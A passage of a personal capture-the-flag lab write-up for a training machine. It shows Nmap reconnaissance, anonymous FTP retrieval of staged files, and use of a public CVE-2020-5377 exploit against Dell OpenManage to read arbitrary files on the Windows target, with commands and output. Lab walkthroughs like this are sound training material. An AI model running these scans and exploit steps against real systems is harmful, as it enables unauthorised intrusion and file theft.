I first attempted this lab about a month ago. But I don't remember why; I left immediately after starting. A few days back, I thought of completing the Nmap room that I started a while back,
and I was sad after I completed the lab because it made me realise that I did not know anything about Nmap. I have very sparse knowledge about Nmap. After the Nmap room, I thought I had
to start using the right scripts and stop using Rustscan, which is way noisier. So, now I am back to "only" Nmap. I tried to maintain anonymity using Nmap because of the room's description.

Enumeration part:
```
┌──(kali㉿kali)-[~/Desktop/THM/HackSmarterSecurity]
└─$ sudo nmap -sS -p- 10.10.228.242 > nmap_ports.txt

┌──(kali㉿kali)-[~/Desktop/THM/HackSmarterSecurity]
└─$ sudo nmap -sC -Pn -p21,22,80,1311,3389 -sV -O 10.10.228.242 >> nmap_ports.txt 

┌──(kali㉿kali)-[~/Desktop/THM/HackSmarterSecurity]
└─$ cat nmap_ports.txt
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-21 20:08 IST
Nmap scan report for 10.10.228.242
Host is up (0.25s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
1311/tcp open  rxmon
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 692.24 seconds
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-21 20:49 IST
Nmap scan report for 10.10.228.242
Host is up (0.25s latency).

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 06-28-23  02:58PM                 3722 Credit-Cards-We-Pwned.txt
|_06-28-23  03:00PM              1022126 stolen-passport.png
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 0d:fa:da:de:c9:dd:99:8d:2e:8e:eb:3b:93:ff:e2:6c (RSA)
|   256 5d:0c:df:32:26:d3:71:a2:8e:6e:9a:1c:43:fc:1a:03 (ECDSA)
|_  256 c4:25:e7:09:d6:c9:d9:86:5f:6e:8a:8b:ec:13:4a:8b (ED25519)
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: HackSmarterSec
1311/tcp open  ssl/rxmon?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Strict-Transport-Security: max-age=0
|     X-Frame-Options: SAMEORIGIN
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     vary: accept-encoding
|     Content-Type: text/html;charset=UTF-8
|     Date: Wed, 21 Aug 2024 15:20:01 GMT
|     Connection: close
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
|     <html>
|     <head>
|     <META http-equiv="Content-Type" content="text/html; charset=UTF-8">
|     <title>OpenManage&trade;</title>
|     <link type="text/css" rel="stylesheet" href="/oma/css/loginmaster.css">
|     <style type="text/css"></style>
|     <script type="text/javascript" src="/oma/js/prototype.js" language="javascript"></script><script type="text/javascript" src="/oma/js/gnavbar.js" language="javascript"></script><script type="text/javascript" src="/oma/js/Clarity.js" language="javascript"></script><script language="javascript">
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Strict-Transport-Security: max-age=0
|     X-Frame-Options: SAMEORIGIN
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     vary: accept-encoding
|     Content-Type: text/html;charset=UTF-8
|     Date: Wed, 21 Aug 2024 15:20:07 GMT
|     Connection: close
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
|     <html>
|     <head>
|     <META http-equiv="Content-Type" content="text/html; charset=UTF-8">
|     <title>OpenManage&trade;</title>
|     <link type="text/css" rel="stylesheet" href="/oma/css/loginmaster.css">
|     <style type="text/css"></style>
|_    <script type="text/javascript" src="/oma/js/prototype.js" language="javascript"></script><script type="text/javascript" src="/oma/js/gnavbar.js" language="javascript"></script><script type="text/javascript" src="/oma/js/Clarity.js" language="javascript"></script><script language="javascript">
| ssl-cert: Subject: commonName=hacksmartersec/organizationName=Dell Inc/stateOrProvinceName=TX/countryName=US
| Not valid before: 2023-06-30T19:03:17
|_Not valid after:  2025-06-29T19:03:17
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-08-21T15:20:56+00:00; +1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: HACKSMARTERSEC
|   NetBIOS_Domain_Name: HACKSMARTERSEC
|   NetBIOS_Computer_Name: HACKSMARTERSEC
|   DNS_Domain_Name: hacksmartersec
|   DNS_Computer_Name: hacksmartersec
|   Product_Version: 10.0.17763
|_  System_Time: 2024-08-21T15:20:50+00:00
| ssl-cert: Subject: commonName=hacksmartersec
| Not valid before: 2024-08-20T14:36:18
|_Not valid after:  2025-02-19T14:36:18
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1311-TCP:V=7.94SVN%T=SSL%I=7%D=8/21%Time=66C605A0%P=x86_64-pc-linux
SF:-gnu%r(GetRequest,1089,"HTTP/1\.1\x20200\x20\r\nStrict-Transport-Securi
SF:ty:\x20max-age=0\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-Content-Type-Op
SF:tions:\x20nosniff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nvary:\x20
SF:accept-encoding\r\nContent-Type:\x20text/html;charset=UTF-8\r\nDate:\x2
SF:0Wed,\x2021\x20Aug\x202024\x2015:20:01\x20GMT\r\nConnection:\x20close\r
SF:\n\r\n<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\.0\x20
SF:Strict//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-strict\.dtd\
SF:">\r\n<html>\r\n<head>\r\n<META\x20http-equiv=\"Content-Type\"\x20conte
SF:nt=\"text/html;\x20charset=UTF-8\">\r\n<title>OpenManage&trade;</title>
SF:\r\n<link\x20type=\"text/css\"\x20rel=\"stylesheet\"\x20href=\"/oma/css
SF:/loginmaster\.css\">\r\n<style\x20type=\"text/css\"></style>\r\n<script
SF:\x20type=\"text/javascript\"\x20src=\"/oma/js/prototype\.js\"\x20langua
SF:ge=\"javascript\"></script><script\x20type=\"text/javascript\"\x20src=\
SF:"/oma/js/gnavbar\.js\"\x20language=\"javascript\"></script><script\x20t
SF:ype=\"text/javascript\"\x20src=\"/oma/js/Clarity\.js\"\x20language=\"ja
SF:vascript\"></script><script\x20language=\"javascript\">\r\n\x20")%r(HTT
SF:POptions,1089,"HTTP/1\.1\x20200\x20\r\nStrict-Transport-Security:\x20ma
SF:x-age=0\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-Content-Type-Options:\x2
SF:0nosniff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nvary:\x20accept-en
SF:coding\r\nContent-Type:\x20text/html;charset=UTF-8\r\nDate:\x20Wed,\x20
SF:21\x20Aug\x202024\x2015:20:07\x20GMT\r\nConnection:\x20close\r\n\r\n<!D
SF:OCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\.0\x20Strict//E
SF:N\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-strict\.dtd\">\r\n<ht
SF:ml>\r\n<head>\r\n<META\x20http-equiv=\"Content-Type\"\x20content=\"text
SF:/html;\x20charset=UTF-8\">\r\n<title>OpenManage&trade;</title>\r\n<link
SF:\x20type=\"text/css\"\x20rel=\"stylesheet\"\x20href=\"/oma/css/loginmas
SF:ter\.css\">\r\n<style\x20type=\"text/css\"></style>\r\n<script\x20type=
SF:\"text/javascript\"\x20src=\"/oma/js/prototype\.js\"\x20language=\"java
SF:script\"></script><script\x20type=\"text/javascript\"\x20src=\"/oma/js/
SF:gnavbar\.js\"\x20language=\"javascript\"></script><script\x20type=\"tex
SF:t/javascript\"\x20src=\"/oma/js/Clarity\.js\"\x20language=\"javascript\
SF:"></script><script\x20language=\"javascript\">\r\n\x20");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (89%)
Aggressive OS guesses: Microsoft Windows Server 2019 (89%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 0s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 74.77 seconds
```

Using the `-sS` flag, I scanned for all the open ports. Then, I used the version and OS scans with the open ports to identify the services running on those ports.

An FTP port is opened. I could have used the NSE scripts to identify whether an anonymous login is allowed on this FTP server, but testing that manually doesn't take much time.

```
┌──(kali㉿kali)-[~/Desktop/THM/HackSmarterSecurity]
└─$ ftp 10.10.228.242 -a
Connected to 10.10.228.242.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
230 User logged in.
Remote system type is Windows_NT.
ftp> ls -la
229 Entering Extended Passive Mode (|||49791|)
125 Data connection already open; Transfer starting.
06-28-23  02:58PM                 3722 Credit-Cards-We-Pwned.txt
06-28-23  03:00PM              1022126 stolen-passport.png
```

I copied the 2 files on my machine using the `get <file_name>` command. The image file showed an error, and the text file contained the Credit Card info, both being useless 

Port 22, SSH, would be useless without any user ID, password or private key.

Then comes port 80, a website which doesn't help much. Even subdirectories using dirsearch don't help much. All the sub-directories were inaccessible.

Port 3389, the RDP port, also requires a username and password to log into the remote desktop.

Port 1131 is useful. Searching for 'rxmon' on the net, we get that 'Dell OpenManage' is running on that port. Logging to the port on the browser, we see a login page. 

<img src="https://github.com/user-attachments/assets/84252669-368d-45a0-8e2e-4fe4da86710d" width=300 height=300>

I tried to log in using the IP address of the machine and the default credentials `root:root`, but it didn't work.

Then I saw the 'About' at the bottom of the page. I clicked on that, and a new window popped up. It took some time to display the content. In the meantime, I tried `curl` to get the content but it showed only the
HTML thing.

```
┌──(kali㉿kali)-[~/Desktop/THM/HackSmarterSecurity]
└─$ curl https://10.10.228.242:1311/UOMSAAbout -k
<HTML xmlns:fo="http://www.w3.org/1999/XSL/Format">
<head>
<META http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>About&nbsp;
                                Dell EMC OpenManage </title>
<script type="text/javascript" src="/oma/js/favicon.js"></script><script language="javascript">
                                        changeFavicon('/oma/images/dell/favicon.ico'); 
                                </script>
</head>
<frameset border="0" rows="100%">
<frame framespacing="0" frameborder="no" marginwidth="0" marginheight="0" scrolling="auto" name="about" src="./UDataArea?plugin=com.dell.oma.webplugins.AboutWebPlugin&vid=">
</frameset>
<noframes></noframes>
</HTML>
```

I waited for the browser to load. Upon loading, I obtained the version number of the OpenManage: 9.4.0.2. I searched for its exploit, and upon searching , I found no exploit specifically
for this version. CVE-2020-5377 is available, but this exploit is for version 9.4.0.0. I tried to use the 9.4.0.0 version exploit on the target machine, and it did worked.

```
┌──(kali㉿kali)-[~/Desktop/THM/HackSmarterSecurity]
└─$ python3 CVE-2020-5377.py <Attacker_IP> <Target_IP>:<Target_Port>
Session: B37FD2868A9D0BC5F3DA99CC4B55AA9C
VID: A51B88FDFFA57D2E
file >
```

A Windows machine, and I am not familiar with the the CMD command. I found a GitHub repo with a list of commands

https://github.com/soffensive/windowsblindread/blob/master/windows-files.txt

I tried the Windows version of /etc/hosts:

```
file > c:/windows/system32/drivers/etc/hosts
Reading contents of c:/windows/system32/drivers/etc/hosts:
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host

# localhost name resolution is handled within DNS itself.
#       127.0.0.1       localhost
#       ::1             localhost
```
